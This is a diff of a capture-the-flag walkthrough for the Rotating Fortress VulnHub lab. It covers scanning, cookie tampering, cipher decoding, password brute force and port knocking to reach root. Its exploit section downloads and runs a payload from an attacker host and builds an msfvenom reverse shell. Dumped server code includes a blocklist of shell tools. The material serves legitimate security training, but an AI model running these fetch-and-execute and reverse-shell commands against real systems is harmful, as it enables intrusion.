@@ -1,112 +1,899 @@
-https://hackso.me/rotating-fortress-1.0.1-walkthrough/
+
+<https://www.vulnhub.com/entry/rotating-fortress-101,248/>
+
+<https://hackso.me/rotating-fortress-1.0.1-walkthrough/>
+
+<https://www.dcode.fr/>
+
+<https://morsecode.scphillips.com/labs/audio-decoder-adaptive/>
+
+# Keywords
+
+web cookies, Caesar cipher, morse code, wfuzz, knock port
 
 
-Description
+# Description
 
-Difficulty: Intermediate/Hard
+> Difficulty: Intermediate/Hard
+> 
+> Rotating Fortress has been serveral months in the making and has a unique feature that sets it apart from other vms ;)
+> Zeus the admin of the server is retiring from Project: Rotating Fortress, but he doesn't want the project to die with his retirment. To find the > successor to the project he has created a challenge. Will you be able to get in, rotate the fortress, escape isolation and reach root?
+> 
+> Your Goal is to get root and read /flag.txt
+> 
+> Note: This isn't a short VM and may take several hours to complete.
 
-Rotating Fortress has been serveral months in the making and has a unique feature that sets it apart from other vms ;)
-
-Zeus the admin of the server is retiring from Project: Rotating Fortress, but he doesn't want the project to die with his retirment. To find the successor to the project he has created a challenge. Will you be able to get in, rotate the fortress, escape isolation and reach root?
-
-Your Goal is to get root and read /flag.txt
-
-Note: This isn't a short VM and may take several hours to complete.
+# Scan `nmap`
 
 
-└─$ sudo nmap -sT -A -Pn -n -p- 192.168.110.13
-Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
-Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-13 15:32 CEST
-Nmap scan report for 192.168.110.13
-Host is up (0.00041s latency).
-Not shown: 65533 closed ports
-PORT      STATE SERVICE VERSION
-80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
-|_http-server-header: Apache/2.4.25 (Debian)
-|_http-title: Site doesn't have a title (text/html).
-27025/tcp open  unknown
-| fingerprint-strings: 
-|   DNSStatusRequestTCP, GenericLines, SSLSessionReq: 
-|     Connection establised 
-|     Requesting Challenge Hash...
-|   DNSVersionBindReqTCP, HTTPOptions, NULL, RPCCheck, RTSPRequest, TLSSessionReq, TerminalServerCookie: 
-|     Connection establised 
-|     Requesting Challenge Hash... 
-|     Connection Closed: Access Denied [Challenge Hash Did Not Return Any Results From Database]
-|   GetRequest: 
-|     Connection establised 
-|     Connection Closed: Access Denied [Challenge Hash Did Not Return Any Results From Database] 
-|_    Requesting Challenge Hash...
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port27025-TCP:V=7.91%I=7%D=4/13%Time=60759D69%P=x86_64-pc-linux-gnu%r(N
-SF:ULL,91,"Connection\x20establised\x20\nRequesting\x20Challenge\x20Hash\.
-SF:\.\.\x20\nConnection\x20Closed:\x20Access\x20Denied\x20\[Challenge\x20H
-SF:ash\x20Did\x20Not\x20Return\x20Any\x20Results\x20From\x20Database\]\x20
-SF:\n")%r(GenericLines,35,"Connection\x20establised\x20\nRequesting\x20Cha
-SF:llenge\x20Hash\.\.\.\x20\n")%r(GetRequest,91,"Connection\x20establised\
-SF:x20\nConnection\x20Closed:\x20Access\x20Denied\x20\[Challenge\x20Hash\x
-SF:20Did\x20Not\x20Return\x20Any\x20Results\x20From\x20Database\]\x20\nReq
-SF:uesting\x20Challenge\x20Hash\.\.\.\x20\n")%r(HTTPOptions,91,"Connection
-SF:\x20establised\x20\nRequesting\x20Challenge\x20Hash\.\.\.\x20\nConnecti
-SF:on\x20Closed:\x20Access\x20Denied\x20\[Challenge\x20Hash\x20Did\x20Not\
-SF:x20Return\x20Any\x20Results\x20From\x20Database\]\x20\n")%r(RTSPRequest
-SF:,91,"Connection\x20establised\x20\nRequesting\x20Challenge\x20Hash\.\.\
-SF:.\x20\nConnection\x20Closed:\x20Access\x20Denied\x20\[Challenge\x20Hash
-SF:\x20Did\x20Not\x20Return\x20Any\x20Results\x20From\x20Database\]\x20\n"
-SF:)%r(RPCCheck,91,"Connection\x20establised\x20\nRequesting\x20Challenge\
-SF:x20Hash\.\.\.\x20\nConnection\x20Closed:\x20Access\x20Denied\x20\[Chall
-SF:enge\x20Hash\x20Did\x20Not\x20Return\x20Any\x20Results\x20From\x20Datab
-SF:ase\]\x20\n")%r(DNSVersionBindReqTCP,91,"Connection\x20establised\x20\n
-SF:Requesting\x20Challenge\x20Hash\.\.\.\x20\nConnection\x20Closed:\x20Acc
-SF:ess\x20Denied\x20\[Challenge\x20Hash\x20Did\x20Not\x20Return\x20Any\x20
-SF:Results\x20From\x20Database\]\x20\n")%r(DNSStatusRequestTCP,35,"Connect
-SF:ion\x20establised\x20\nRequesting\x20Challenge\x20Hash\.\.\.\x20\n")%r(
-SF:SSLSessionReq,35,"Connection\x20establised\x20\nRequesting\x20Challenge
-SF:\x20Hash\.\.\.\x20\n")%r(TerminalServerCookie,91,"Connection\x20establi
-SF:sed\x20\nRequesting\x20Challenge\x20Hash\.\.\.\x20\nConnection\x20Close
-SF:d:\x20Access\x20Denied\x20\[Challenge\x20Hash\x20Did\x20Not\x20Return\x
-SF:20Any\x20Results\x20From\x20Database\]\x20\n")%r(TLSSessionReq,91,"Conn
-SF:ection\x20establised\x20\nRequesting\x20Challenge\x20Hash\.\.\.\x20\nCo
-SF:nnection\x20Closed:\x20Access\x20Denied\x20\[Challenge\x20Hash\x20Did\x
-SF:20Not\x20Return\x20Any\x20Results\x20From\x20Database\]\x20\n");
-MAC Address: 08:00:27:CC:11:0A (Oracle VirtualBox virtual NIC)
-Device type: general purpose
-Running: Linux 3.X|4.X
-OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
-OS details: Linux 3.2 - 4.9
-Network Distance: 1 hop
+    $ sudo nmap -sT -A -Pn -n -p- 192.168.110.5
+    Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+    Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-13 15:32 CEST
+    Nmap scan report for 192.168.110.5
+    Host is up (0.00041s latency).
+    Not shown: 65533 closed ports
+    PORT      STATE SERVICE VERSION
+    80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
+    |_http-server-header: Apache/2.4.25 (Debian)
+    |_http-title: Site doesn't have a title (text/html).
+    27025/tcp open  unknown
+    | fingerprint-strings: 
+    |   DNSStatusRequestTCP, GenericLines, SSLSessionReq: 
+    |     Connection establised 
+    |     Requesting Challenge Hash...
+    |   DNSVersionBindReqTCP, HTTPOptions, NULL, RPCCheck, RTSPRequest, TLSSessionReq, TerminalServerCookie: 
+    |     Connection establised 
+    |     Requesting Challenge Hash... 
+    |     Connection Closed: Access Denied [Challenge Hash Did Not Return Any Results From Database]
+    |   GetRequest: 
+    |     Connection establised 
+    |     Connection Closed: Access Denied [Challenge Hash Did Not Return Any Results From Database] 
+    |_    Requesting Challenge Hash...
 
-TRACEROUTE
-HOP RTT     ADDRESS
-1   0.41 ms 192.168.110.13
+    Device type: general purpose
+    Running: Linux 3.X|4.X
+    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+    OS details: Linux 3.2 - 4.9
+    Network Distance: 1 hop
 
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 154.00 seconds
+    TRACEROUTE
+    HOP RTT     ADDRESS
+    1   0.41 ms 192.168.110.5
+
+    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 154.00 seconds
                                                                 
 
-└─$ curl -c cookie http://192.168.110.13/Janus.php
+
+
+# Web service
+
+## 
+
+    └─$ curl -c cookie http://192.168.110.5/Janus.php
+    <html>
+    <title>
+    Janus
+    </title>
+    <body>
+        You're not the Admin!
+    </body>
+    </html>
+
+## Modify 
+
+    └─$ cat cookie
+    # Netscape HTTP Cookie File
+    # https://curl.se/docs/http-cookies.html
+    # This file was generated by libcurl! Edit at your own risk.
+
+    192.168.110.5  FALSE   /       FALSE   0       isAdmin 1
+ 
+
+     └─$ curl -b cookie http://192.168.110.5/Janus.php
+    <html>
+    <title>
+    Janus
+    </title>
+    <body>
+        Welcome Back Admin Last edited file was: /LELv3FfpLrbX1S4Q2FHA1hRtIoQa38xF8dzc8O9z/home.html Flag: 1{7daLI]} ggez
+    </body>
+    </html>
+          
+
+
+## ./loki.bin
+
+### Reverse code
+
+```c
+
+#include <stdint.h>
+#include <stdio.h>
+#include <string.h>
+
+char * g5; 
+
+int main(int argc, char ** argv) {
+    for (int64_t i = 0; i < 19; i++) {
+        int32_t v1 = *(int32_t *)(4 * i + (int64_t)L"xBspsiONMSNXeVuiomFXHQRGFsKNWxF"); // 0xcca
+        *(char *)(i + (int64_t)&g5) = (char)v1;
+    }
+    printf((char *)&g5);
+    return 0;
+}
+
+
+# $ ./test 
+# xBspsiONMSNXeVuiomF
+
+```
+
+### Execute `loki.bin`
+
+    $ ./loki.bin 
+    Enter Password: xBspsiONMSNXeVuiomF
+
+    access_granted! 
+    Welcome back Loki
+    To do:             
+    - Operation Smoke And Mirrors [X]
+    - Ask Zeus whats going on he's acting strange []
+    - Project FortNET [In Progress]                 
+    - Operation 679 [In Progress]                   
+    - Build a better decoder, just got to remember the rules: split '|', ++ ' ', // '.', Caesar cipher so letters are represented with numbers then shifted by the key which is displayed above each message []
+    - Operation Dual USB Assault [X]                                                                                                                                                                           
+    - Update Security []
+    - Flag 2{tr09u2} What would happen if I just say...input 1000 A's?
+
+
+
+# Decrypt messages Caesar cipher
+
+## sh
+
+
+```bash
+
+# decrypt.sh
+
+#!/bin/bash
+
+FILE=$1
+KEY=$2
+
+echo "[+] Trying $KEY..."
+
+for x in $(cat $FILE | sed -r -e 's/^\|//' -e 's/\|$//' -e 's/\|\|/\n/g'); do
+  grep -E "^[0-9]+$" <<<"$x" &>/dev/null && \
+    printf "\\$(printf "%o" $((x + $KEY)))\n" || \
+      echo "$x"
+done \
+| tr -d '\n' \
+| sed -e 's/\+\+/ /g' -e 's/\/\//./g'
+
+echo
+echo "-----"
+
+
+# for key in $(seq 1 99); do ./decrypt.sh msg1.txt $key; done
+
+
+```
+
+## python
+
+```py
+
+for k in range(84,85):
+    f = open("msg1.txt", "r")
+    print (k)
+    for x in f:
+        x = x.strip()
+        x = x.split("||++||")
+        for m in x:
+            m = m.replace("/", " ")
+            m = m.replace("|", " ")
+            m = m.replace("+", " ")
+            m = m.split()
+            for i in m:
+                if i != "":
+                    print(chr(int(i)+k),end='')
+            print(" ",end='')       
+        print("")
+    f.close()
+
+
+
+```
+
+## messages decoded
+
+> zeus here. after a long time of thinking i have decided to retire from project rotating fortress. however i do not want to kill the project with my retirement so i am presenting you all a challenge. i have set up a puzzle on the server if you can get past all puzzles the server is yours. by the way i have removed everybodies logins from the server expect mine so this wont be easy. take this it might be useful edvqyhwmfvqrducqjbzumysrwdgmfdht. good luck.|
+
+    $ wget http://192.168.110.5/LELv3FfpLrbX1S4Q2FHA1hRtIoQa38xF8dzc8O9z/resources/Harpocrates.gif
+    $ strings  Harpocrates.gif
+    ~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$#"! 
+    ;Flag 3{~ATXVfzXk} he's the sneaky man [101] goto: /|117||107||126||104||109||108||105||117||123||114||125||117||122||117||105||112||114||104||123||104||121||108||108||118||122||126||107||114||108||123||103||121|/
+
+    # decoded
+    You have come far but your journey is not over yet. ./Papa_Legba will guide you, good luck. Flag: decoded and ready to roll out, Flag 4{d#B=TVf5} 
+
+
+### Morse code
+
+ IN 2001 I WAS CONTACTED BY A USER CALLED L0K1. HE INVITED ME TO A GROUP I HAD NEVER HEARD OF BEFORE, HE GAVE ME AN IP AND THEN WENT SILENT. AFTER SCANNING THE IP I SAW IT HAD IRC RUNNING ON IT. WHEN I CONNECTED, LOKI WAS WAITING FOR ME AND SAID I HAD TO OVERCOME A CHALLENGE BEFORE I WAS ALLOWED IN, HE GAVE ME ANOTHER IP AND SENT ME ON MY WAY. TELLING ME TO NOT COME BACK UNTIL I HAD THE FLAG. CALL ME INTRIGUED, I DECIDED TO ACCEPT THE CHALLENGE. THE SERVER I WAS SUPPOSED TO ATTACK WAS SOMETHING DIFFERENT THAT I HADN'T SEEN BEFORE. IT HAD SOME SORT OF IDS THAT WHEN TRIGGERED WOULD CHANGE STUFF ON THE SERVER, PASSWORDS AND EVEN ACCOUNTS WOULD BE REMOVED OR MODIFIED, FILES WOULD CHANGE AND SERVICES WOULD CHANGE PORTS. IT WAS A NIGHTMARE BUT I FINALLY MANAGED TO FINISH IT A WEEK LATER. I CAME BACK TO THE IRC SERVER AND POSTED THE FLAG, I WAS THEN ACCEPTED INTO THE GROUP BY ZEUS. =-PAPA LEGBA 
+
+
+### Log file
+
+    #zeuswashere
+    LOG BEGIN
+    whoami
+    nano ../LELv3FfpLrbX1S4Q2FHA1hRtIoQa38xF8dzc8O9z/wheel.php
+    scanning wheel.php for dangrous command(s)...
+    found no dangerous command(s)
+    nano ../LELv3FfpLrbX1S4Q2FHA1hRtIoQa38xF8dzc8O9z/robots.txt
+    nano ../LELv3FfpLrbX1S4Q2FHA1hRtIoQa38xF8dzc8O9z/home.html
+    nano ../LELv3FfpLrbX1S4Q2FHA1hRtIoQa38xF8dzc8O9z/news.html
+    nano ../LELv3FfpLrbX1S4Q2FHA1hRtIoQa38xF8dzc8O9z/eris.php
+    scanning eris.php for dangrous command(s)...
+    found no dangerous command(s)
+    nano Papa_Legba/index.php
+    scanning eris.php for dangrous command(s)...
+    found no dangerous command(s)
+    nano chat.php
+    scanning chat.php for dangrous command(s)...
+    found no dangerous command(s)
+    nc -lvp 30000
+    +1
+    echo && nc -lvp 30000
+    +1
+    echo ;nc -lvp 30000
+    +1
+    ZEUS_D::COUNTER: REACHED (3)
+    executing payload_s1...
+    flag::is_allowed_to_roam_on_web_server=0
+    (nc -lvp 30000) &
+    +1
+    cd ../
+    +1
+    nano ../pls
+    +1
+    nano chat.txt
+    nano chat.php
+    scanning chat.php for dangrous command(s)...
+    found dangerous command(s) [line 56: system(nc ...]
+    dangrous command(s) removed
+    +1
+    ls -la
+    +1
+    python -c 'import pty; pty.spawn("/bin/sh")'
+    +1
+    echo "fuck off"
+    +1
+    ZEUS_D::COUNTER: REACHED (10)
+    executing payload_s2...
+    executing: echo "Nice try loki but you won't get around this with one of your shells, goodbye -zeus"
+    executing: rm .l_s2.php
+    LOG END
+
+
+### Generate password 
+
+
+```py
+
+#!/usr/bin/env python
+
+from sets import Set
+from itertools import product
+
+s1 = Set(['O','W','V','S','I','U','C','F','O'])
+s2 = Set(['D','Z','Y','W','V','O','W','H','Q'])
+s3 = Set(['B','Z','G','Z','O','Y','U','J','B'])
+s4 = Set(['A','O','W','X','K','J','B','Y','U'])
+s5 = Set(['F','J','S','Y','V','B','E','W','C'])
+s6 = Set(['L','W','J','U','R','Y','X','Q','W'])
+s7 = Set(['C','M','V','Y','X','Q','P','J','Y'])
+s8 = Set(['U','S','N','J','V','V','U','K','C'])
+s9 = Set(['K','V','P','Z','T','O','V','C','X'])
+
+
+s2 -= s3
+s3 -= s4
+s4 -= s5
+s5 -= s6
+s6 -= s7
+s7 -= s8
+s8 -= s9
+s9 -= s1
+
+
+iterables = [ s1, s2, s3, s4, s5, s6, s7, s8, s9 ]
+for t in product(*iterables):
+  print ''.join(list(t))
+
+```
+
+### Brute force
+
+
+    wfuzz -w passwords.txt -d "password=FUZZ" -t 100 --hh 803 http://192.168.110.5/pfychgdpvmxpupdkmcvctggquyfmgvbt/Papa_Legba/index.php
+
+
+==> IHGAERMNT
+
+    Flag 5{XOIQMZ} Hidden in plain sight, well done goto: /pfychgdpvmxpupdkmcvctggquyfmgvbt/xhyzwrwjrf/
+
+
+    wget http://192.168.110.5/pfychgdpvmxpupdkmcvctggquyfmgvbt/images/knock_knock.jpg
+
+
+### knock port
+
+```bash
+# knock.sh
+
+#!/bin/bash
+
+TARGET=$1
+PORTS="39997,40002,39999,39997,39993,39993"
+
+echo "[*] Trying sequence $PORTS..."
+for port in $(echo $PORTS | tr ',' ' '); do
+    nmap -n -v0 -Pn --max-retries 0 -p $port $TARGET
+done
+
+sleep 3
+
+nmap -n -v -Pn -p- -A --reason $TARGET -oN ${PORTS}.txt
+
+# for p in 39997 40002 39999 39997 39993 39993; do nmap -Pn --host-timeout 201 --max-retries 0 -p $p 192.168.110.5; done
+
+
+```
+
+### Flags
+
+> 1{7daLI]}
+> 2{tr09u2}
+> 3{~ATXVfzXk}
+> 4{d#B=TVf5}
+> 5{XOIQMZ}
+> 6{r98yf53k<2x}
+
+
+# Exploit
+
+## One way shell
+
+    └─$ nc 192.168.110.5 40000
+    Connection establised
+    Please enter all the flags you have collected (not seperated, only data inside '{}'):
+    7daLI]tr09u2~ATXVfzXkd#B=TVf5XOIQMZ
+
+     
+
+    ░▒▓ -= ZEUS' 1-WAY SHELL =- ▓▒░
+
+
+
+
+    ls
+    Command Excecuted
+    wget -O /tmp/rev http://192.168.110.1:8000/rev
+    Did not execute command because it was dangerous/backlisted!
+    (wget -O /tmp/rev http://192.168.110.1:8000/rev)
+    Command Excecuted
+    (chmod +x /tmp/rev)
+    Command Excecuted
+    (/tmp/rev)
+
+## Reverse shell
+
+    # msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.110.1 LPORT=4444 --platform linux -a x64 -f elf -o rev
+    $ nc -lvp 4444
+    listening on [any] 4444 ...
+    192.168.110.5: inverse host lookup failed: Unknown host
+    connect to [192.168.110.1] from (UNKNOWN) [192.168.110.5] 58570
+    id
+    uid=1000(newc0mer) gid=1000(newc0mer) groups=1000(newc0mer)
+
+
+
+# Get root
+
+
+    newc0mer@Rotating-Fortress:/home/www-data/deamon$ cat Flag_6.txt
+    Flag 6 {r98yf53k<2x} Knock Knock...Who's There. It's me HACKERMAN!
+
+    login: zeus:ALL_FLAGS_COMBINED
+    newc0mer@Rotating-Fortress:/home/www-data/deamon$
+
+    newc0mer@Rotating-Fortress:/home/www-data/deamon$ su zeus
+    Password: 7daLI]tr09u2~ATXVfzXkd#B=TVf5XOIQMZr98yf53k<2x
+    zeus@Rotating-Fortress:/home/www-data/deamon$ sudo -l
+    [sudo] password for zeus: 7daLI]tr09u2~ATXVfzXkd#B=TVf5XOIQMZr98yf53k<2x
+    Matching Defaults entries for zeus on Rotating-Fortress:
+        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+    User zeus may run the following commands on Rotating-Fortress:
+        (ALL : ALL) ALL
+    zeus@Rotating-Fortress:/home/www-data/deamon$ sudo su
+    root@Rotating-Fortress:/home/www-data/deamon# id
+    uid=0(root) gid=0(root) groups=0(root)
+
+
+# Code's machine
+
+## netstat
+
+    root@Rotating-Fortress:/home# netstat  -tlpn
+    Active Internet connections (only servers)
+    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+    tcp        0      0 0.0.0.0:27025           0.0.0.0:*               LISTEN      705/python3         
+    tcp        0      0 0.0.0.0:1337            0.0.0.0:*               LISTEN      706/python3         
+    tcp        0      0 0.0.0.0:40000           0.0.0.0:*               LISTEN      1473/python3        
+    tcp6       0      0 :::80                   :::*                    LISTEN      824/apache2         
+    root@Rotating-Fortress:/home# ls
+
+
+## ifconfig 
+
+
+    root@Rotating-Fortress:~# ifconfig -a
+    enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+            inet 192.168.110.5  netmask 255.255.255.0  broadcast 192.168.110.255
+            inet6 fe80::a00:27ff:fe4c:aa55  prefixlen 64  scopeid 0x20<link>
+            ether 08:00:27:4c:aa:55  txqueuelen 1000  (Ethernet)
+            RX packets 405490  bytes 26683857 (25.4 MiB)
+            RX errors 0  dropped 0  overruns 0  frame 0
+            TX packets 687089  bytes 464261175 (442.7 MiB)
+            TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+    lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+            inet 127.0.0.1  netmask 255.0.0.0
+            inet6 ::1  prefixlen 128  scopeid 0x10<host>
+            loop  txqueuelen 1  (Local Loopback)
+            RX packets 31360  bytes 2540160 (2.4 MiB)
+            RX errors 0  dropped 0  overruns 0  frame 0
+            TX packets 31360  bytes 2540160 (2.4 MiB)
+            TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+## Mechanism
+
+    root@Rotating-Fortress:/home/www-data/deamon# cat nts.txt
+    DEAMONS
+
+    =========================
+    |       wheel.sh        |
+    =========================
+    - uses a file with m(x) to active different modes
+    - wheel.sh is in charge of turning services on and off as well as isolation for webserver
+
+    ========================
+    |  knockd_responder.py |
+    ========================
+    - Limited Backdoor Shell actived by port knock
+
+    ========================
+    |    knockd_red.sh     |
+    ========================
+    - Starts knockd_responder.py
+
+
+## Janus.php
+
+```php
+
 <html>
 <title>
 Janus
 </title>
 <body>
-    You're not the Admin!
+  <?php
+  setcookie("isAdmin","0", 0);
+  ?>
+  <?php
+  if ($_COOKIE["isAdmin"] == 1){
+    echo "Welcome Back Admin";
+    echo " Last edited file was: /LELv3FfpLrbX1S4Q2FHA1hRtIoQa38xF8dzc8O9z/home.html";
+    echo " Flag: 1{7daLI]} ggez";
+  }
+  else {
+    echo "You're not the Admin!";
+  }
+  ?>
+
 </body>
 </html>
 
-└─$ cat cookie
-# Netscape HTTP Cookie File
-# https://curl.se/docs/http-cookies.html
-# This file was generated by libcurl! Edit at your own risk.
+```
 
-192.168.110.13  FALSE   /       FALSE   0       isAdmin 1
- └─$ curl -b cookie http://192.168.110.13/Janus.php
+## wheel
+
+### wheel startup `/etc/init.d/wheel`
+
+```bash
+# root@Rotating-Fortress:/var/www# cat /etc/init.d/wheel
+#!/bin/sh
+echo "starting wheel"
+rm /home/www-data/deamon/m*
+touch /home/www-data/deamon/m1
+(/home/www-data/deamon/wheel.sh) &
+
+
+```
+
+### `/home/www-data/deamon/wheel.sh`
+
+
+```bash
+
+#!/bin/bash
+donem1="0"
+donem2="0"
+donem3="0"
+started="0"
+foundsomething="0"
+
+while true
+do
+foundsomething="0"
+if [ -f /home/www-data/deamon/m1 ]
+then
+    foundsomething="1"
+    chmod 777 m*
+    #echo "m1" >> /home/www-data/deamon/counter
+    if [ $donem1 == "0" ]
+    then
+        donem3="0"
+        started="1"
+        donem2="0"
+        echo "mode 1"
+        sudo killall python3
+        (sudo python3 /home/zeus/loki/backdoor_responder.py) &
+        sudo service apache2 restart
+        sudo service ssh stop
+        sudo service vsftpd stop
+        sudo service knockd stop
+        sudo killall knockd
+        sudo mv /var/www/html/pfychgdpvmxpupdkmcvctggquyfmgvbt /var/www/disabled/ -f
+        donem1="1"
+    else
+        echo "mode 1 done"
+    fi
+fi
+
+if [ -f /home/www-data/deamon/m2 ]
+then
+    foundsomething="1"
+    chmod 777 m*
+    #echo "m2" >> /home/www-data/deamon/counter
+    if [ $donem2 == "0" ]
+    then
+        donem1="0"
+        donem3="0"
+        echo "mode 2"
+        sudo killall python3
+        (sudo python3 /home/zeus/loki/backdoor_responder.py) &
+        (sudo python3 /home/zeus/loki/backdoor_shell.py) &
+        sudo service ssh stop
+        sudo service vsftpd stop
+        sudo service knockd restart
+        knockd -i enp0s3 -d
+        sudo mv /var/www/disabled/pfychgdpvmxpupdkmcvctggquyfmgvbt/ /var/www/html/ -f
+        sudo chmod 755 /var/www/html/pfychgdpvmxpupdkmcvctggquyfmgvbt/ -R
+        sudo service apache2 restart
+        donem2="1"
+    else
+        echo "mode 2 done"
+    fi
+
+fi
+
+if [ -f /home/www-data/deamon/m3 ]
+then
+    foundsomething="1"
+    chmod 777 m*
+    #echo "m3" >> /home/www-data/deamon/counter
+    if [ $donem3 == "0" ]
+    then
+        donem1="0"
+        donem2="0"
+        echo "mode 3"
+        sudo killall python3
+        sudo service apache2 restart
+        sudo service ssh restart
+        sudo service vsftpd restart
+        sudo service knockd stop
+        sudo killall knockd
+        donem3="1"
+    else
+        echo "mode 3 done"
+    fi
+
+fi
+
+if [ $foundsomething == 0 ]
+then
+    #echo "ERR CANNOT FIND FILE" >> /home/www-data/deamon/counter
+    echo "cannot find file!"
+    sleep 10
+fi
+
+echo ""
+echo ""
+echo ""
+echo "cycle done"
+chmod 777 m*
+sleep 5
+done
+
+
+```
+
+
+### wheel.php
+
+```php
+
+cat ./html/LELv3FfpLrbX1S4Q2FHA1hRtIoQa38xF8dzc8O9z/wheel.php
+<?php
+  setcookie("wheel_code","0", 0);
+  $err = 0;
+?>
+<!-- 
+0x00 - reset 
+
+Loki here: once you guys get past isolation come to chat.php and we can try and regain control
+-->
+
+<style>
+
+body{
+   background-color: #0c0c0c;
+}
+
+</style>
+
 <html>
-<title>
-Janus
-</title>
+<head>
+    <title> Wheel </title>
+    <link rel="Stylesheet" href="banner.css" type="text/css" />
+</head>
+<div>
+  <back>
+  <banner>
+    <img src="icons/logo.png" alt="server-icon" width=auto height=70px>
+    <banner_text>
+      <a href="home.html"> Home </a>
+      <a href="news.html"> News </a>
+      <a href="wheel.php"> Wheel </a>
+    </banner_text>
+  </banner>
 <body>
-    Welcome Back Admin Last edited file was: /LELv3FfpLrbX1S4Q2FHA1hRtIoQa38xF8dzc8O9z/home.html Flag: 1{7daLI]} ggez
+<br><br><br><br>
+<div style="color: white">
+  <?php
+  $err = 0;
+  if ($_COOKIE["wheel_code"] == "___________my_backd00r_cookie:P______"){
+    echo "backdoor removed - Zeus";
+    $err = -1;
+  }
+  else if ($_COOKIE["wheel_code"] == "edvqyhwmfvqrducqjbzumysrwdgmfdht"){
+    echo exec("rm /home/www-data/deamon/m*");
+    echo exec("touch /home/www-data/deamon/m2");
+  }
+  else if ($_COOKIE["wheel_code"] == "  "){
+    echo exec("rm /home/www-data/deamon/m*");
+    echo exec("touch /home/www-data/deamon/m3");
+  }
+  else if ($_COOKIE["wheel_code"] == "0x00"){
+    $err = -1;
+    echo "wheel reset";
+    echo exec("rm /home/www-data/deamon/m*");
+    echo exec("touch /home/www-data/deamon/m1");
+  }
+  else if ($_COOKIE["wheel_code"] == "rxmg7n83qv98by"){
+    $err = 2;
+  }
+  else{
+  $err = 1;
+  }
+?>
+</div>
+<div style="color: red">
+  <?php
+  if ($err == 1){
+    echo "ACCESS_DENIED";
+  }
+  if ($err == 2){
+    echo "ACCESS_DENIED";
+    echo "syntax error line 42: if (['wheel_code] == '___________my_backd00r_cookie:P______') {";
+  }
+?>
+</div>
+    <?php
+    if ($err == 0){
+    echo '<video width=100% height=auto autoplay style="z-index: 0">';
+    echo '<source src="/LELv3FfpLrbX1S4Q2FHA1hRtIoQa38xF8dzc8O9z/resources/wheel.mp4">';
+    }
+    ?>
 </body>
 </html>
-      
+
+
+
+```
+
+
+
+###  knockd.conf
+
+
+    #root@Rotating-Fortress:/etc# cat knockd.conf 
+    [options]
+            UseSyslog
+
+    [knock_resonder]
+            sequence    = 39997, 40002, 39999, 39997, 39993, 39993
+            seq_timeout = 4
+            command     = (/home/www-data/deamon/knockd_red.sh) &
+            tcpflags    = syn
+    root@Rotating-Fortress:/etc# 
+
+
+
+### /home/www-data/deamon/knockd_red.sh
+
+```bash
+
+#!/bin/bash
+donem1="0"
+donem2="0"
+donem3="0"
+started="0"
+foundsomething="0"
+if [ -f /home/www-data/deamon/m2 ]
+then
+    foundsomething="1"
+    (runuser -l newc0mer -c "python3 /home/www-data/deamon/knockd_responder.py")&
+
+fi
+
+if [ -f /home/www-data/deamon/m3 ]
+then
+    foundsomething="1"
+    (runuser -l newc0mer -c "python3 /home/www-data/deamon/knockd_responder.py")&
+
+fi
+
+if [ $foundsomething == 0 ]
+then
+    #echo "ERR CANNOT FIND FILE" >> /home/www-data/deamon/counter_k
+    echo "cannot find file!"
+    sleep 10
+fi
+
+echo ""
+echo ""
+echo ""
+echo "cycle done"
+sleep 5
+
+```
+
+### /home/www-data/deamon/knockd_responder.py
+
+
+```py
+
+#!/usr/bin/python3
+
+import socket
+import sys
+from _thread import *
+import os
+import subprocess
+import time
+
+def forwardmessage(outdata):
+    outdata = str(outdata + "\n")
+    out = outdata.encode()
+    conn.send(out)
+
+def help():
+    outdata = "\n Command List: \n help \n echo \n whoami"
+    forwardmessage(outdata)
+
+HOST = '' #All interfaces
+PORT = 40000
+MAXRECV = 1024
+err = 'Connection Closed: Access Denied'
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Creates socket
+s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+s.bind((HOST, PORT))
+print('Binding Complete On Port: ')
+s.listen(50)
+print('Socket is now listening....')
+print('PORT: ' + str(PORT))
+data = "b'\xc1\x0c[{ \x995\xd0\x9b+:\x85\x8f\xab\x8c\xb4'"
+
+
+def clientThread(conn):
+    solved = 0
+    outdata = "Connection establised "
+    forwardmessage(outdata)
+    outdata = "Please enter all the flags you have collected (not seperated, only data inside '{}'): "
+    forwardmessage(outdata)
+    while True:
+        try:
+            command = []
+            bad_man_words = ["nc", "python", "python3", "cat", "cd", "wget", "git", "nmap", "make", "echo", "touch", "rm", "mv"]
+            command_is_not_evil = 1
+            data = conn.recv(MAXRECV)
+            if not data:
+                break
+            data = data.decode().strip()
+            if "7daLI]tr09u2~ATXVfzXkd#B=TVf5XOIQMZ" in data:
+                solved = 1
+                outdata = "\n \n"
+                forwardmessage(outdata)
+                outdata = "░▒▓ -= ZEUS' 1-WAY SHELL =- ▓▒░"
+                forwardmessage(outdata)
+                outdata = "\n\n"
+                forwardmessage(outdata)
+                data = "help"
+            elif solved == 1:
+
+                #FILTERING // lets || through meaning y||x y is false so x is executed
+                if ";" in data:
+                    command_is_not_evil = -1
+                if "&&" in data:
+                    command_is_not_evil = -1
